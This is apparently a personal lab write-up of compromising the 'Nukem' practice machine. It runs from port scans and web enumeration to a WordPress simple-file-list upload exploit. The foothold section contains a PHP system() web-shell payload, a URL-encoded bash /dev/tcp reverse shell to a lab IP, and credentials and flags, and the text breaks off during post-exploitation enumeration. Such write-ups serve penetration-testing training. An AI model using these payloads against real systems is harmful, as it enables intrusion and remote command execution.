**Metadata**

- IP Address:  192.168.162.105
- Hostname: nukem
- OS: 	Arch Linux
- Found Credentials/Users:
		Commander / CommanderKeenVorticons1990

Main Objectives:

Local.txt = d68b55e10a22e02afffa69ccd158d919
Proof.txt = 1622481b3c3aefed57c09b6ec3c5c59d

**Enumeration**

1. NMAP Scans (TCP/UDP)

```
[+] Running: Nmap BASIC TCP (top 1000)
[+] Command: nmap -sS -Pn -n --top-ports 1000 -T4 --open 192.168.162.105 -oN - 
# Nmap 7.95 scan initiated Tue Jan 20 13:47:55 2026 as: nmap -sS -Pn -n --top-ports 1000 -T4 --open -oN - 192.168.162.105
Nmap scan report for 192.168.162.105
Host is up (0.073s latency).
Not shown: 996 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
5000/tcp open  upnp

[+] Running: Nmap ALL TCP (all ports + versions)
[+] Command: nmap -sS -Pn -n -p- -T4 --open -sV --version-all 192.168.162.105 -oN /home/kali/ProvingGround/Nukem/nmap/full_tcp.nmap -oG /home/kali/ProvingGround/Nukem/nmap/full_tcp.gnmap 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-20 13:48 MST
Nmap scan report for 192.168.162.105
Host is up (0.072s latency).
Not shown: 65529 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.3 (protocol 2.0)
80/tcp    open  http        Apache httpd 2.4.46 ((Unix) PHP/7.4.10)
3306/tcp  open  mysql       MariaDB 10.3.24 or later (unauthorized)
5000/tcp  open  http        Werkzeug httpd 1.0.1 (Python 3.8.5)
13000/tcp open  http        nginx 1.18.0
36445/tcp open  netbios-ssn Samba smbd 4

[+] Running: Nmap MEDIUM UDP (top 1000 + bounded)
[+] Command: nmap -sU -Pn -n --top-ports 1000 -T4 --open -sV --version-intensity 5 --max-retries 1 --host-timeout 20m 192.168.162.105 -oN /home/kali/ProvingGround/Nukem/nmap/medium_udp.nmap -oG /home/kali/ProvingGround/Nukem/nmap/medium_udp.gnmap 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-20 13:50 MST
Stats: 0:17:05 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 36.00% done; ETC: 14:35 (0:27:21 remaining)
Stats: 0:17:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 36.00% done; ETC: 14:35 (0:27:26 remaining)
Nmap scan report for 192.168.162.105
Host is up.
Skipping host 192.168.162.105 due to host timeout
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1200.32 seconds




```

2. Interesting Ports/Services

```
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.3 (protocol 2.0)
80/tcp    open  http        Apache httpd 2.4.46 ((Unix) PHP/7.4.10)
3306/tcp  open  mysql       MariaDB 10.3.24 or later (unauthorized)
5000/tcp  open  http        Werkzeug httpd 1.0.1 (Python 3.8.5)
13000/tcp open  http        nginx 1.18.0
36445/tcp open  netbios-ssn Samba smbd 4
```

3. SSH Enumeration

```
22/tcp    open  ssh         OpenSSH 8.3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:6a:f5:d3:30:08:7a:ec:38:28:a0:88:4d:75:da:19 (RSA)
|   256 43:3b:b5:bf:93:86:68:e9:d5:75:9c:7d:26:94:55:81 (ECDSA)
|_  256 e3:f7:1c:ae:cd:91:c1:28:a3:3a:5b:f6:3e:da:3f:58 (ED25519)

```

4. Web Enumeration 

```
80/tcp    open  http        Apache httpd 2.4.46 ((Unix) PHP/7.4.10)
|_http-generator: WordPress 5.5.1
|_http-title: Retro Gamming &#8211; Just another WordPress site
|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.10

Webserver Info - Apache httpd 2.4.46 
Running Applications - PHP/7.4.10 WordPress 5.5.1
Site Visit - 

[+] Directory search BASIC on HTTP ports: 80,5000,13000
[+] Running: Gobuster BASIC (80)
[+] Command: gobuster dir -u http://192.168.162.105:80 -w /usr/share/wordlists/dirb/common.txt -t 50 -o /home/kali/ProvingGround/Nukem/gobuster/Nukem_192.168.162.105_80_dir_basic.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.105:80
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 980]
/~bin                 (Status: 403) [Size: 980]
/~ftp                 (Status: 403) [Size: 980]
/~mail                (Status: 403) [Size: 980]
/~nobody              (Status: 403) [Size: 980]
/~root                (Status: 403) [Size: 980]
/.hta                 (Status: 403) [Size: 980]
/.htpasswd            (Status: 403) [Size: 980]
/index.php            (Status: 301) [Size: 0] [--> http://192.168.162.105/]
/wordpress            (Status: 301) [Size: 241] [--> http://192.168.162.105/wordpress/]
/wp-admin             (Status: 301) [Size: 240] [--> http://192.168.162.105/wp-admin/]
/wp-content           (Status: 301) [Size: 242] [--> http://192.168.162.105/wp-content/]
/wp-includes          (Status: 301) [Size: 243] [--> http://192.168.162.105/wp-includes/]
/xmlrpc.php           (Status: 405) [Size: 42]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished


[+] Running: Gobuster ADVANCED (80)
[+] Command: gobuster dir -u http://192.168.162.105:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o /home/kali/ProvingGround/Nukem/gobuster/Nukem_192.168.162.105_80_dir_advanced.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.105:80
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/wp-content           (Status: 301) [Size: 242] [--> http://192.168.162.105/wp-content/]
/wordpress            (Status: 301) [Size: 241] [--> http://192.168.162.105/wordpress/]
/wp-includes          (Status: 301) [Size: 243] [--> http://192.168.162.105/wp-includes/]
/wp-admin             (Status: 301) [Size: 240] [--> http://192.168.162.105/wp-admin/]
Progress: 96499 / 220558 (43.75%)[ERROR] error on word 84786: timeout occurred during the request
Progress: 220556 / 220558 (100.00%)
Progress: 220558 / 220558 (100.00%)===============================================================
Finished

gobuster dir -u http://192.168.101.110 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,asp,aspx,txt,log,bak,conf,ini,db,json,zip,tar,gz
# Files

[+] Running: Gobuster FILE search (80)
[+] Command: gobuster dir -u http://192.168.162.105:80 -w /usr/share/wordlists/dirb/common.txt -x php\,asp\,aspx\,jsp\,html\,txt\,bak\,old\,zip\,tar\,tar.gz -t 50 -o /home/kali/ProvingGround/Nukem/gobuster/Nukem_192.168.162.105_80_files.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.105:80
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              aspx,jsp,txt,bak,php,asp,html,old,zip,tar,tar.gz
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

/index.php            (Status: 301) [Size: 0] [--> http://192.168.162.105/]
/index.php            (Status: 301) [Size: 0] [--> http://192.168.162.105/]
/license.txt          (Status: 200) [Size: 19915]
Progress: 31422 / 55356 (56.76%)[ERROR] error on word latest.tar.gz: timeout occurred during the request
/readme.html          (Status: 200) [Size: 7278]
/wordpress            (Status: 301) [Size: 241] [--> http://192.168.162.105/wordpress/]
/wp-admin             (Status: 301) [Size: 240] [--> http://192.168.162.105/wp-admin/]
/wp-content           (Status: 301) [Size: 242] [--> http://192.168.162.105/wp-content/]
/wp-blog-header.php   (Status: 200) [Size: 0]
/wp-includes          (Status: 301) [Size: 243] [--> http://192.168.162.105/wp-includes/]
/wp-config.php        (Status: 200) [Size: 0]
/wp-settings.php      (Status: 500) [Size: 0]
/wp-cron.php          (Status: 200) [Size: 0]
/wp-links-opml.php    (Status: 200) [Size: 228]
/wp-load.php          (Status: 200) [Size: 0]
/wp-mail.php          (Status: 403) [Size: 2674]
/wp-login.php         (Status: 200) [Size: 6193]
/wp-signup.php        (Status: 302) [Size: 0] [--> http://192.168.120.55/wp-login.php?action=register]
/wp-trackback.php     (Status: 200) [Size: 135]
/xmlrpc.php           (Status: 405) [Size: 42]
/xmlrpc.php           (Status: 405) [Size: 42]
Progress: 55356 / 55356 (100.00%)
Progress: 55356 / 55356 (100.00%)===============================================================
Finished

[+] Running: Gobuster LOWERCASE dir (80)
[+] Command: gobuster dir -u http://192.168.162.105:80 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -o /home/kali/ProvingGround/Nukem/gobuster/Nukem_192.168.162.105_80_dir_lowercase.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.105:80
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/wp-content           (Status: 301) [Size: 242] [--> http://192.168.162.105/wp-content/]
/wordpress            (Status: 301) [Size: 241] [--> http://192.168.162.105/wordpress/]
/wp-includes          (Status: 301) [Size: 243] [--> http://192.168.162.105/wp-includes/]
/wp-admin             (Status: 301) [Size: 240] [--> http://192.168.162.105/wp-admin/]
(100.00%)===============================================================
Finished

[+] Running: Nikto (80)
[+] Command: nikto -h http://192.168.162.105:80 -output /home/kali/ProvingGround/Nukem/web/192.168.162.105_80/nikto.txt -Format txt 
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.162.105
+ Target Hostname:    192.168.162.105
+ Target Port:        80
+ Start Time:         2026-01-20 15:21:31 (GMT-7)
---------------------------------------------------------------------------
+ Server: Apache/2.4.46 (Unix) PHP/7.4.10
+ /: Retrieved x-powered-by header: PHP/7.4.10.
+ RFC-1918 /: IP address found in the 'link' header. The IP is "192.168.120.55". See: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /index.php?: Uncommon header 'x-redirect-by' found, with contents: WordPress.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ PHP/7.4.10 appears to be outdated (current is at least 8.1.5), PHP 7.4.28 for the 7.4 branch.
+ Apache/2.4.46 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ /icons/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version.
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ /license.txt: License file found may identify site software.
+ /: A Wordpress installation was found.
+ /wordpress/: Directory indexing found.
+ /wp-login.php?action=register: Cookie wordpress_test_cookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /wp-content/uploads/: Directory indexing found.
+ /wp-content/uploads/: Wordpress uploads directory is browsable. This may reveal sensitive information.
+ /wp-login.php: Wordpress login found.
+ 8103 requests: 0 error(s) and 21 item(s) reported on remote host
+ End Time:           2026-01-20 15:33:03 (GMT-7) (692 seconds)


```

5. MySQL Enumeration

```
3306/tcp  open  mysql       MariaDB 10.3.24 or later (unauthorized)

sudo nmap -p 3306 --script=mysql-info,mysql-enum,mysql-databases,mysql-users,mysql-variables,mysql-empty-password,mysql-brute 192.168.162.105
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-20 14:23 MST
Nmap scan report for 192.168.162.105
Host is up (0.073s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
|_mysql-empty-password: Host '192.168.45.151' is not allowed to connect to this MariaDB server
| mysql-enum: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0
| mysql-brute: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 50009 guesses in 463 seconds, average tps: 114.7

Nmap done: 1 IP address (1 host up) scanned in 463.58 seconds


mysql -h <target> -u root -p
mysql -h <target> -u root --password=""
mysql -h <target> -u admin -padmin
mysql -h <target> -u test -ptest
mysql -h <target> -u root -proot
mysql -h <target> -u root -ppassword

mysql -h <target> -u '' --password=''

```

6. Port 5000 Enumeration

```
5000/tcp  open  http        Werkzeug httpd 1.0.1 (Python 3.8.5)
|_http-title: 404 Not Found

[+] Command: gobuster dir -u http://192.168.162.105:5000 -w /usr/share/wordlists/dirb/common.txt -t 50 -o /home/kali/ProvingGround/Nukem/gobuster/Nukem_192.168.162.105_5000_dir_basic.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.105:5000
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/employees            (Status: 500) [Size: 37]
/tracks               (Status: 500) [Size: 37]
Progress: 4518 / 4613 (97.94%)
Progress: 4613 / 4613 (100.00%)===============================================================
Finished

[+] Running: Gobuster ADVANCED (5000)
[+] Command: gobuster dir -u http://192.168.162.105:5000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o /home/kali/ProvingGround/Nukem/gobuster/Nukem_192.168.162.105_5000_dir_advanced.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.105:5000
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/employees            (Status: 500) [Size: 37]
/tracks               (Status: 500) [Size: 37]
Progress: 133021 / 220558 (60.31%)[ERROR] error on word 109831: timeout occurred during the request
Progress: 220520 / 220558 (99.98%)
Progress: 220558 / 220558 (100.00%)===============================================================
Finished

===============================================================
[+] Running: Gobuster FILE search (5000)
[+] Command: gobuster dir -u http://192.168.162.105:5000 -w /usr/share/wordlists/dirb/common.txt -x php\,asp\,aspx\,jsp\,html\,txt\,bak\,old\,zip\,tar\,tar.gz -t 50 -o /home/kali/ProvingGround/Nukem/gobuster/Nukem_192.168.162.105_5000_files.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.105:5000
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              tar,aspx,jsp,html,old,tar.gz,php,asp,txt,bak,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/employees            (Status: 500) [Size: 37]
/tracks               (Status: 500) [Size: 37]
Progress: 55278 / 55356 (99.86%)
Progress: 55356 / 55356 (100.00%)===============================================================
Finished

[+] Running: Gobuster LOWERCASE dir (5000)
[+] Command: gobuster dir -u http://192.168.162.105:5000 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -o /home/kali/ProvingGround/Nukem/gobuster/Nukem_192.168.162.105_5000_dir_lowercase.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.105:5000
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/employees            (Status: 500) [Size: 37]
/tracks               (Status: 500) [Size: 37]
Finished
===============

[+] Running: Nikto (5000)
[+] Command: nikto -h http://192.168.162.105:5000 -output /home/kali/ProvingGround/Nukem/web/192.168.162.105_5000/nikto.txt -Format txt 
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.162.105
+ Target Hostname:    192.168.162.105
+ Target Port:        5000
+ Start Time:         2026-01-20 15:33:04 (GMT-7)
---------------------------------------------------------------------------
+ Server: Werkzeug/1.0.1 Python/3.8.5
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Python/3.8.5 appears to be outdated (current is at least 3.9.6).
+ 8101 requests: 0 error(s) and 3 item(s) reported on remote host
+ End Time:           2026-01-20 15:53:33 (GMT-7) (1229 seconds)



```

7. Port 13000 Enumeration

```
13000/tcp open  http        nginx 1.18.0
|_http-title: Login V14
|_http-server-header: nginx/1.18.0

Site Visit:
1. Login v14
2. Tried basic sqli bypass
3. Tried admin admin

[+] Running: Gobuster BASIC (13000)
[+] Command: gobuster dir -u http://192.168.162.105:13000 -w /usr/share/wordlists/dirb/common.txt -t 50 -o /home/kali/ProvingGround/Nukem/gobuster/Nukem_192.168.162.105_13000_dir_basic.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.105:13000
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 169] [--> http://192.168.162.105:13000/css/]
/fonts                (Status: 301) [Size: 169] [--> http://192.168.162.105:13000/fonts/]
/images               (Status: 301) [Size: 169] [--> http://192.168.162.105:13000/images/]
/index.html           (Status: 200) [Size: 5057]
/js                   (Status: 301) [Size: 169] [--> http://192.168.162.105:13000/js/]
/vendor               (Status: 301) [Size: 169] [--> http://192.168.162.105:13000/vendor/]
Progress: 4596 / 4613 (99.63%)
===============================================================
Finished
==========

[+] Running: Gobuster ADVANCED (13000)
[+] Command: gobuster dir -u http://192.168.162.105:13000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o /home/kali/ProvingGround/Nukem/gobuster/Nukem_192.168.162.105_13000_dir_advanced.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.105:13000
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 169] [--> http://192.168.162.105:13000/images/]
/css                  (Status: 301) [Size: 169] [--> http://192.168.162.105:13000/css/]
/js                   (Status: 301) [Size: 169] [--> http://192.168.162.105:13000/js/]
/vendor               (Status: 301) [Size: 169] [--> http://192.168.162.105:13000/vendor/]
/fonts                (Status: 301) [Size: 169] [--> http://192.168.162.105:13000/fonts/]
Progress: 220558 / 220558 (100.00%)
===============================================================
Progress: 220558 / 220558 (100.00%)
Finished

[+] Running: Gobuster FILE search (13000)
[+] Command: gobuster dir -u http://192.168.162.105:13000 -w /usr/share/wordlists/dirb/common.txt -x php\,asp\,aspx\,jsp\,html\,txt\,bak\,old\,zip\,tar\,tar.gz -t 50 -o /home/kali/ProvingGround/Nukem/gobuster/Nukem_192.168.162.105_13000_files.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.105:13000
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              asp,aspx,jsp,txt,bak,tar.gz,php,html,old,zip,tar
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 169] [--> http://192.168.162.105:13000/css/]
/fonts                (Status: 301) [Size: 169] [--> http://192.168.162.105:13000/fonts/]
/images               (Status: 301) [Size: 169] [--> http://192.168.162.105:13000/images/]
/index.html           (Status: 200) [Size: 5057]
/index.html           (Status: 200) [Size: 5057]
/js                   (Status: 301) [Size: 169] [--> http://192.168.162.105:13000/js/]
/vendor               (Status: 301) [Size: 169] [--> http://192.168.162.105:13000/vendor/]
Progress: 55346 / 55356 (99.98%)
===============================================================
Finished

[+] Running: Gobuster LOWERCASE dir (13000)
[+] Command: gobuster dir -u http://192.168.162.105:13000 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -o /home/kali/ProvingGround/Nukem/gobuster/Nukem_192.168.162.105_13000_dir_lowercase.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.105:13000
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 169] [--> http://192.168.162.105:13000/images/]
/css                  (Status: 301) [Size: 169] [--> http://192.168.162.105:13000/css/]
/js                   (Status: 301) [Size: 169] [--> http://192.168.162.105:13000/js/]
/vendor               (Status: 301) [Size: 169] [--> http://192.168.162.105:13000/vendor/]
/fonts                (Status: 301) [Size: 169] [--> http://192.168.162.105:13000/fonts/]
Progress: 207483 / 207641 (99.92%)
Progress: 207641 / 207641

[+] Running: Nikto (13000)
[+] Command: nikto -h http://192.168.162.105:13000 -output /home/kali/ProvingGround/Nukem/web/192.168.162.105_13000/nikto.txt -Format txt 
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.162.105
+ Target Hostname:    192.168.162.105
+ Target Port:        13000
+ Start Time:         2026-01-20 15:53:34 (GMT-7)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8103 requests: 0 error(s) and 3 item(s) reported on remote host
+ End Time:           2026-01-20 16:04:06 (GMT-7) (632 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

8. SMB Port 36445 Enumeration

```
36445/tcp open  netbios-ssn Samba smbd 4

smbclient -L //192.168.101.110 -U anonymous
ls
mget 
put dork.txt

enum4linux $IP

smbmap -H 192.168.101.110                  

smbclient //192.168.101.110/Backup -N          

```

9. Possible Exploits

```
[+] simple-file-list
 | Location: http://192.168.162.105/wp-content/plugins/simple-file-list/
 | Last Updated: 2025-07-03T17:02:00.000Z
 | Readme: http://192.168.162.105/wp-content/plugins/simple-file-list/readme.txt
 | [!] The version is out of date, the latest version is 6.1.15
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.162.105/wp-content/plugins/simple-file-list/, status: 200
 |
 | Version: 4.2.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.162.105/wp-content/plugins/simple-file-list/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.162.105/wp-content/plugins/simple-file-list/readme.txt

https://www.exploit-db.com/exploits/48449
```

10. Other Notes

```

```

**Initial Foothold** 

1. Exploit Steps

- After trial and error used the https://www.exploit-db.com/exploits/48449 and updated the payload data using the simple php backdoor code found in /usr/share/webshells/php/simple-backdoor.php. Everything else in exploit 48449 was left the same (you can just ignore the post and password requirements from the previous payload).

```
def generate():
    filename = f'{random.randint(0, 10000)}.png'
    password = hashlib.md5(bytearray(random.getrandbits(8)
                                     for _ in range(20))).hexdigest()
    with open(f'{filename}', 'wb') as f:
        payload = '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>'
        f.write(payload.encode())
    print(f'[ ] File {filename} generated with password: {password}')
    return filename, password

```

- Visited http://192.168.162.105/wp-content/uploads/simple-file-list/4353.php?cmd=id to test.

![[Pasted image 20260122120702.png]]

- Setup listener using Penelope, url encoded reverse shell, and executed in url. 

```
penelope -p 80

http://192.168.162.105/wp-content/uploads/simple-file-list/4353.php?cmd=0%3C%26196%3Bexec+196%3C%3E%2Fdev%2Ftcp%2F192.168.45.151%2F80%3B+bash+%3C%26196+%3E%26196+2%3E%26196
```

![[Pasted image 20260122121635.png]]

- Received reverse shell as user http and was able to cat the local.txt file.

![[Pasted image 20260122121733.png]]

2. Shell Upgrade

```
python3 -c 'import pty; pty.spawn("/bin/bash")'

python -c 'import pty; pty.spawn("/bin/bash")'

/usr/bin/script -qc /bin/bash /dev/null

export TERM=xterm

export SHELL=/bin/bash

Ctrl+Z

stty raw -echo; fg

reset
```

**Post-Exploitation**

1. Identify & System Info

```
[+] whoami
$ whoami
http

[+] id
$ id
uid=33(http) gid=33(http) groups=33(http)

[+] hostname
$ hostname
nukem

[+] pwd
$ pwd
/srv/http/wp-content/uploads/simple-file-list

[+] uname -a
$ uname -a
Linux nukem 5.8.9-arch2-1 #1 SMP PREEMPT Sun, 13 Sep 2020 23:44:55 +0000 x86_64 GNU/Linux

[+] os-release / issue
$ cat /etc/os-release 2>/dev/null || cat /etc/issue 2>/dev/null
NAME="Arch Linux"
PRETTY_NAME="Arch Linux"
ID=arch
BUILD_ID=rolling
ANSI_COLOR="38;2;23;147;209"
HOME_URL="https://www.archlinux.org/"
DOCUMENTATION_URL="https://wiki.archlinux.org/"
SUPPORT_URL="https://bbs.archlinux.org/"
BUG_REPORT_URL="https://bugs.archlinux.org/"
LOGO=archlinux


```

2. Environment

```
[+] env
$ env
SHELL=/usr/sbin/bash
PWD=/srv/http/wp-content/uploads/simple-file-list
_=/usr/bin/env
LANG=en_US.UTF-8
INVOCATION_ID=9f8408c35045400c85361a428cd85a14
TERM=xterm-256color
SHLVL=4
JOURNAL_STREAM=8:15702
PATH=/usr/local/sbin:/usr/local/bin:/usr/bin

[+] set (first 50)
$ set 2>/dev/null | head -n 50
BASH=/usr/bin/bash
BASHOPTS=checkwinsize:cmdhist:complete_fullquote:extquote:force_fignore:globasciiranges:hostcomplete:interactive_comments:progcomp:promptvars:sourcepath
BASH_ALIASES=()
BASH_ARGC=()
BASH_ARGV=()
BASH_CMDS=()
BASH_EXECUTION_STRING='set 2>/dev/null | head -n 50'
BASH_LINENO=()
BASH_SOURCE=()
BASH_VERSINFO=([0]="5" [1]="0" [2]="18" [3]="1" [4]="release" [5]="x86_64-pc-linux-gnu")
BASH_VERSION='5.0.18(1)-release'
